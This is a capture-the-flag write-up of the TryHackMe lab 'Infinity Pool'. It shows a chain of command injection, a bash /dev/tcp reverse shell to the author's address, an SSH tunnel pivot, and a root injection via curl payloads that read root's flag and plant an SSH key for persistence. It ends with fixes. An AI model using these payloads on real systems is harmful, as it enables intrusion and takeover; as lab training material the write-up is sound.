---
layout: post
title: "THM: Infinity Pool"
date: 2026-08-07 18:00:00
category: "Web Exploitation"
difficulty: "Medium"
tags: [thm, hacker-holidays, web, boot2root, command-injection, pivoting, ssh-tunnel, freepbx, privilege-escalation, rce]
excerpt: "A public network-check tool runs ping on your input with no sanitising, which is command injection and a foothold as a low-priv user. From there it's a long internal pivot: three Flask services bound only to loopback, an unauthenticated config endpoint leaking FreePBX creds, an SSH tunnel into a telephony panel, a bearer token hidden in a voicemail caller-ID, and finally a root-owned automation service with the exact same injection bug as the front door. The box teaches one bug class twice, and escalates from user to root purely by where the vulnerable code runs."
---

<figure class="figure-narrow">
  <img src="{{ '/assets/img/infinity-pool-briefing.png' | relative_url }}" alt="TryHackMe room page: Concierge Briefing for Infinity Pool. Category Boot2Root, difficulty Medium, 90 points. Byte Lotus Hotel promises a seamless stay powered by modern technology. Sometimes the most interesting systems are the ones guests were never meant to see. Itinerary: find the user flag and the root flag.">
  <figcaption>The briefing for Infinity Pool. "The most interesting systems are the ones guests were never meant to see" is the loopback-only root service in one sentence, invisible from outside, the whole point of the box.</figcaption>
</figure>

This is the most involved box I've done, a proper chain, and the thing I like about it is
that it teaches one idea really well by showing it to you twice. The very first bug, command
injection, is also the very last bug. The only thing that changes between them is *who* the
vulnerable code runs as. At the front door it runs as a nobody user. At the end it runs as
root. Same mistake, wildly different blast radius. That is the whole lesson, and everything
in the middle is the work of getting from one to the other.

It's a TryHackMe Hacker Holidays box, the Byte Lotus universe again, an "Infinity Pool"
themed around a resort's internal tooling. Standard disclaimer, it's a deliberately
vulnerable lab, nothing here is a real service. I've swapped the live IP for `<TARGET_IP>`
and my own VPN address for `<TUN0_IP>`, and the leaked credentials and token for
placeholders.

<figure class="figure-narrow">
  <img src="{{ '/assets/img/infinity-pool-comic.png' | relative_url }}" alt="Event comic titled 03 Reckoning: the guests start comparing notes, they do not enjoy what they find. Hooded characters realise three support tickets were all closed by the same account, that the network has no edge, that something clocked in for a shift that isn't on the rota, and that the guestbook takes instructions. They pin it all on a board connected by red string and conclude it was never separate incidents, every string leads to one place, the property itself is the attack.">
  <figcaption>The event comic for this chapter, "Reckoning." The guests realise it was never separate incidents: "the network has no edge, something clocked in for a shift that isn't on the rota, and the guestbook takes instructions." That's this box, a root service with no exposed edge, reachable only from inside, quietly doing whatever it's told.</figcaption>
</figure>

## The whole chain at a glance

```
Recon: gunicorn app, robots.txt disallows /internal/ and /status
        |
Command injection in /internal/netcheck   (ping, shell=True, f-string)
        |
Reverse shell as 'web'  ->  PTY upgrade  ->  user flag
        |
Enumerate loopback-only services:
   edge (web) : watchtower (svc-watch) : automation (ROOT) : FreePBX (asterisk)
        |
watchtower /api/config  (no auth)  leaks FreePBX credentials
        |
SSH -L tunnel into the loopback FreePBX panel   (mind the 8080 proxy clash)
        |
Voicemail widget caller-ID leaks the automation bearer token
        |
automation /jobs/export interpolates the report name into a tar shell command (runs as ROOT)
        |
Second command injection, this time as root  ->  root flag
```

## Stage 0: recon

<figure>
  <img src="{{ '/assets/img/infinity-pool-landing.png' | relative_url }}" alt="The public Byte Lotus website. A dark, luxury-brand landing page headed 'Every detail, observed.' with the tagline 'Stay Noticed' and copy describing a surveillance-luxe hotel experience. Three cards: The Atrium, Poolside Wing, The Vault Bar. The footer reads 'Byte Lotus Hospitality Group' and 'Internal systems, authorized staff only'.">
  <figcaption>The public site: "surveillance-luxe," "every detail, observed." Pure flavour, but that footer, "internal systems, authorized staff only," is the nudge. The interesting stuff isn't this brochure, it's the staff tooling behind it.</figcaption>
</figure>

Nothing exotic, but two findings shape everything after.

```bash
nmap -sC -sV -A <TARGET_IP>
```

- **22/tcp** OpenSSH. Boring now, but I'll need it later for a tunnel.
- **80/tcp** HTTP with `Server: gunicorn`. That header matters. Gunicorn means a Python app,
  almost always Flask. A dynamic Python app is far more likely to have "helper" endpoints that
  shell out to system tools than a static site is, and shelling out to system tools is exactly
  the bug class I want to find.
- `robots.txt` disallowed `/internal/` and `/status`, which is a polite signpost to the
  interesting area.

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html
```

## Stage 1: command injection on the edge app, foothold as web

<figure>
  <img src="{{ '/assets/img/infinity-pool-netcheck.png' | relative_url }}" alt="The staff tools page at /status, headed 'Sister-property connectivity' under a 'STAFF TOOLS' label. Subtitle: 'Confirm a remote property responds before routing a guest transfer.' A text field with placeholder 'property host e.g. 10.0.0.5' and a 'Check' button.">
  <figcaption>The front door: a staff tool that "confirms a remote property responds" before a guest transfer. In plain terms, it runs ping on whatever host you type, which is exactly the kind of shell-out that goes wrong.</figcaption>
</figure>

Under `/internal/` was a "Sister-property connectivity" tool at `/internal/netcheck`. You give
it a host or IP, it runs `ping` against it on the server and shows you the raw output. The
instant a web app runs a system command on something you typed, you test for command
injection. The classic first probe is to end the expected command and tack on your own with a
shell separator:

```
<TUN0_IP>; id
```

The response appended my own command's output to the ping result:

```
uid=1001(web) gid=1001(web) groups=1001(web)
```

That `id` ran on the server. Once I had a shell I read the source to see exactly why, and it's
the textbook vulnerable pattern:

```python
import subprocess

proc = subprocess.run(
    f"ping -c 1 {host}",   # user input f-string'd straight into a shell command
    shell=True,
    capture_output=True,
    text=True,
    timeout=15,
)
```

Here's the "why." The backend builds one big string, `ping -c 1 <your input>`, and hands it to
a shell with `shell=True`. A shell doesn't see your input as a single argument, it re-parses
the whole string looking for shell syntax. The `;` is a command separator, so the shell runs
`ping -c 1 <TUN0_IP>` and then runs `id` as a completely separate command. Anything after the
`;` is yours. The correct way to write this is to pass an argument vector with no shell,
`subprocess.run(["ping", "-c", "1", host])`, so your input can only ever be a single argument
to `ping` and never new shell syntax, plus validation on `host`.

### Turning that into a shell

A listener on my box:

```bash
nc -lvnp 4444
```

and the payload dropped into the netcheck field:

```
<TUN0_IP>; bash -c 'bash -i >& /dev/tcp/<TUN0_IP>/4444 0>&1'
```

Why bother with a reverse shell when I can already run commands? Because injecting one command
at a time is a miserable way to explore a box. A real interactive shell lets me enumerate,
pivot, and keep state. The `/dev/tcp/IP/PORT` bit is a bash built-in that opens a TCP socket,
and redirecting stdin, stdout and stderr through it hands me an interactive bash back on my
listener.

### Making the shell usable

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
# then Enter twice
```

Why do this dance? A raw reverse shell has no proper terminal, so no job control, no
tab-completion, no arrow keys, and, the big one, `sudo` flatly refuses to run because it wants
a real TTY to read a password from. Upgrading to a PTY fixes all of that. (Here `sudo` was a
dead end anyway, we never had the `web` user's password, but it's a reflex worth having.)

That gave me a stable foothold as `web`, and the user flag:

```bash
cat ~/user.txt
# THM{[redacted]}
```

The flag's actual text is a play on "no visible edge," which is a hint at what's coming: the
real target has no edge exposed to the outside world at all.

## Stage 2: local enumeration, and three services hiding on loopback

This is where the box gets hard, because the privesc is not on the surface. Enumerating from
the `web` shell:

```bash
ls -la /var/www/infinity_pool/        # edge, watchtower, automation
ps aux | grep -iE 'automation|watchtower|python|gunicorn'
ss -lntp
```

The process list was the single most useful artifact on the whole box. There are three
internal Gunicorn apps, and the two things to note for each are the port it binds and the user
it runs as:

| Service    | Bind address     | Runs as     | Why it matters                                  |
|------------|------------------|-------------|-------------------------------------------------|
| edge       | `0.0.0.0:80`     | `web`       | the public ping app, already owned              |
| watchtower | `127.0.0.1:3000` | `svc-watch` | ops console, it leaks config                    |
| automation | `127.0.0.1:9000` | **root**    | the real target, any code execution here is root |
| FreePBX    | `127.0.0.1:8080` | `asterisk`  | telephony panel, holds the token for automation |

Sit with why this layout is the entire puzzle. The `automation` service is the prize, because
running a command there means running it as root. But it's bound to `127.0.0.1`, so from my
attacker box it is completely invisible and unreachable. That's the "no visible edge" from the
flag. The only place `automation` can be reached from is the box itself, which is precisely why
I needed the foothold first. The other two services aren't the goal, they exist to hand me the
credentials and token I need to talk to the root one. A note that shaped my approach: `web`
couldn't read the `automation` or `watchtower` source directories (permission denied), so I had
to enumerate those services over HTTP against their live endpoints, not by reading their code.

Before committing to the custom services I ruled out the usual privesc paths, and it's worth
showing that, because "systematically eliminate the boring routes" is the actual method:

```bash
find / -perm -4000 -type f 2>/dev/null   # SUID: all standard
getcap -r / 2>/dev/null                  # capabilities: all standard
cat /etc/crontab; ls -la /etc/cron.d/    # cron: all default
sudo -l                                  # no password, dead end
```

All standard, all default. When the usual suspects come up empty like this, that's itself a
signal: the intended path is the custom stuff, the three internal services.

## Stage 3: watchtower leaks the FreePBX credentials

Poking watchtower's landing page, it advertised two routes, `/api/health` and `/api/config`.
The config one is the jackpot, and it needs no authentication at all:

```bash
curl -s http://127.0.0.1:3000/api/config
```

```json
{
  "automation_endpoint": "http://127.0.0.1:9000",
  "note": "internal network only -- do not expose",
  "ops_note": "UCP still on default template creds (FreePBXUCPTemplateCreator) -- ROTATE.",
  "telephony_pass": "<TELEPHONY_PASS>",
  "telephony_portal": "http://127.0.0.1:8080/ucp",
  "telephony_user": "FreePBXUCPTemplateCreator"
}
```

Why is this a vulnerability and not just a config page? Because it's an unauthenticated
endpoint handing out plaintext credentials and a map of the internal services. The service
was built assuming "loopback equals safe," so it never bothered with auth. But loopback is only
safe while nobody is on the host, and I am on the host. This is the anti-pattern the whole box
is really about: treating network position as if it were authentication. It never is. (The app
even scolds itself in its own `ops_note` about unrotated default creds, which is a nice touch.)

## Stage 4: an SSH tunnel into the loopback-only FreePBX panel

The FreePBX UCP is a full browser app on `127.0.0.1:8080`. I can't reach it directly from my
machine, and driving a login-heavy web UI over `curl` is painful, so I want it in my actual
browser. The tool for that is an SSH local port-forward. But I only had an injection-based
shell, not an SSH login, so first I gave myself one by planting my own public key into `web`'s
`authorized_keys` (I can write that, it's my own home directory):

On my box:

```bash
ssh-keygen -t ed25519 -f infinity_pool -N ""
cat infinity_pool.pub
```

In the web shell:

```bash
mkdir -p ~/.ssh && chmod 700 ~/.ssh
echo '<SSH_PUBKEY>' >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```

Then from my box, log in and set up the forward in one command:

```bash
ssh -i infinity_pool -L 9090:127.0.0.1:8080 web@<TARGET_IP>
```

Here's what `-L 9090:127.0.0.1:8080` actually means, because port-forward syntax confused me
for ages: "listen on *my* localhost port 9090, and anything that arrives there, tunnel it
through this SSH connection and deliver it to `127.0.0.1:8080` *as seen from the target*." So
when my browser hits `localhost:9090`, it pops out on the target's own loopback at 8080, which
is the FreePBX panel. The tunnel is what makes a loopback-only service reachable.

One gotcha worth flagging because it cost me time and the error was baffling: I first tried to
forward to local port 8080, and got `bind [127.0.0.1]:8080: Address already in use`, then when
I forced it, "Burp Suite, Invalid client request" in the browser. The reason was that 8080 was
already taken by Burp's proxy listener, and my browser's FoxyProxy was funnelling everything
through it. The fix was to disable the browser proxy and pick a non-conflicting local port
(9090). If a forward behaves weirdly, check nothing else already owns that local port.

Then it's just a browser visit to `http://127.0.0.1:9090/ucp/` and a login with the leaked
`FreePBXUCPTemplateCreator` credentials.

<figure>
  <img src="{{ '/assets/img/infinity-pool-freepbx-login.png' | relative_url }}" alt="A FreePBX User Control Panel login page loaded at http://localhost:8080/ucp/index.php, with Username and Password fields, a Login button, and FreePBX / Sangoma branding in the footer.">
  <figcaption>The FreePBX User Control Panel on the target's loopback, reached through the tunnel (my localhost forwards to the target's :8080). Logging in with the credentials watchtower handed me gets me into telephony I was never supposed to touch.</figcaption>
</figure>

## Stage 5: a bearer token hidden in a voicemail widget

Logged into FreePBX, the dashboard is empty, and the token I need is not on any obvious page.
The teaching point of this stage is that secrets leak in the boring corners of an app, the
notification fields, the widgets, the voicemail, places nobody thinks to check. So you have to
enumerate the *whole* application surface. I created a dashboard, opened the widget picker, and
added the one widget that had anything in it: a voicemail inbox. The automation bearer token
was sitting in the last place I would ever have thought to look, the caller-ID field of a
single voicemail message.

<figure>
  <img src="{{ '/assets/img/infinity-pool-voicemail.png' | relative_url }}" alt="A FreePBX voicemail widget for FREEPBXUCPTEMPLATECREATOR showing one inbox message dated Tue Jun 30 2026, duration 3 seconds. The CID (caller ID) column reads 'Automation Key' followed by a blacked-out value and then '<9000>'.">
  <figcaption>The token, hiding in plain sight. One voicemail, and its caller-ID field holds the automation bearer token (blacked out here). Nobody thinks to read voicemail caller IDs, which is exactly why the box author put it there. Enumerate everything.</figcaption>
</figure>

The caller ID read `Automation Key <AUTOMATION_TOKEN> <9000>`, and that trailing `<9000>` is a
not-very-subtle hint about which service the token authenticates to: the automation service on
port 9000.

## Stage 6: the same bug again, this time as root

Back in my `web` SSH session, the automation service documents itself if you ask:

```bash
curl -s http://127.0.0.1:9000/health
```

```json
{
  "endpoints": {
    "GET /health": "service status",
    "POST /jobs/export": {
      "auth": "Authorization: Bearer <automation key>",
      "body": {"report": "<report name>"},
      "desc": "archive the latest data export"
    }
  },
  "runs_as": "root",
  "service": "automation",
  "status": "ok"
}
```

It even tells you `runs_as: root`. A normal request to the export endpoint is helpful enough to
echo back the command it builds:

```bash
KEY='<AUTOMATION_TOKEN>'
curl -s -X POST -H "Authorization: Bearer $KEY" -H "Content-Type: application/json" \
  http://127.0.0.1:9000/jobs/export -d '{"report":"test"}'
# command: tar czf /var/automation/exports/test.tgz /var/automation/data
```

Look at where my `report` value lands: unquoted, in the middle of a `tar` shell command. That
is Stage 1 all over again, string concatenation of user input into a shell string, except this
process is root. Same probe, the `;` separator:

```bash
curl -s -X POST -H "Authorization: Bearer $KEY" -H "Content-Type: application/json" \
  http://127.0.0.1:9000/jobs/export -d '{"report":"x; id;"}'
```

```json
{"command":"tar czf /var/automation/exports/x; id;.tgz /var/automation/data 2>&1",
 "output":"uid=0(root) gid=0(root) groups=0(root)\n/bin/sh: 1: .tgz: not found\ntar: Cowardly refusing to create an empty archive\n..."}
```

The shell parses `tar czf /var/automation/exports/x; id;.tgz ...` as three statements: a `tar`
that makes a harmless mess and errors, then `id` running as **root**, then a bogus `.tgz`
command that errors. The `uid=0(root)` in the output is the proof. Identical root cause to the
front door, but because this service needlessly runs as root, one injection is total
compromise. If it had run as its own low-priv service account, the same bug would have been
contained.

### Taking root

The quick way, read the flag straight out:

```bash
curl -s -X POST -H "Authorization: Bearer $KEY" -H "Content-Type: application/json" \
  http://127.0.0.1:9000/jobs/export -d '{"report":"x; cat /root/root.txt;"}'
```

```json
{"command":"tar czf /var/automation/exports/x; cat /root/root.txt;.tgz /var/automation/data 2>&1",
 "output":"THM{[redacted]}\n/bin/sh: 1: .tgz: not found\ntar: Cowardly refusing to create an empty archive\n..."}
```

Redacted, as always. The flag's text is a play on being "traced to the horizon," which fits a
box whose whole point was chasing a target you couldn't see from the outside.

The cleaner way, if you want a real root shell rather than one-shot commands, is to plant your
key in root's `authorized_keys` through the same injection and then just SSH in as root:

```bash
curl -s -X POST -H "Authorization: Bearer $KEY" -H "Content-Type: application/json" \
  http://127.0.0.1:9000/jobs/export \
  -d '{"report":"x; mkdir -p /root/.ssh; echo <SSH_PUBKEY> >> /root/.ssh/authorized_keys;"}'
# then, from my box:
ssh -i infinity_pool root@<TARGET_IP>
```

A planted key beats firing single commands because it survives the request, gives you a proper
TTY, and persists. It's the difference between running one command as root and actually owning
the box.

## How to actually fix this box

- **Never build shell commands by concatenating user input.** Both injections here were the
  exact same `shell=True` f-string mistake. Use an argument vector with no shell
  (`subprocess.run([...])`) and validate/allowlist the input.
- **Loopback binding is reduced exposure, not a security boundary.** Anything on the host can
  reach it. Do not treat "it's only on 127.0.0.1" as authentication.
- **Don't leak credentials or internal maps through unauthenticated endpoints.** The
  `/api/config` route was the hinge of the whole pivot.
- **Don't run web services as root**, especially ones that shell out to system tools. Least
  privilege would have turned the root injection into a mere `web`-level one.
- **Rotate default and template credentials.** The box literally warned about this in its own
  ops note.
- **Secrets leak in secondary interfaces.** Voicemail fields, widgets, notifications. Enumerate
  the whole surface when attacking, and don't stash secrets there when building.

## What I took away

- **One bug class, twice, escalating by context.** The identical command-injection pattern
  went from a nobody user to root purely based on which process carried it. Where vulnerable
  code runs is as important as the bug itself.
- **The process list is a map.** `ps aux` showing three loopback services and, crucially, the
  user each runs as, is what turned a confusing privesc into an obvious plan.
- **Network position is not authentication.** Loopback-only and unauthenticated is fine right
  up until someone gets a foothold, and then it's wide open.
- **Rule out the boring paths on purpose.** SUID, caps, cron, sudo all coming up empty was the
  signal that pointed me at the custom services.
- **SSH `-L` turns a loopback service into a browser tab**, and if a forward misbehaves, check
  what already owns that local port before blaming the target.

> Room: Infinity Pool on TryHackMe (Hacker Holidays 2026). Flags left out as always, though
> their text ("no visible edge," "traced to the horizon") tells the story: a root service with
> no exposure to the outside, reachable only after you climb in through the one door that was.
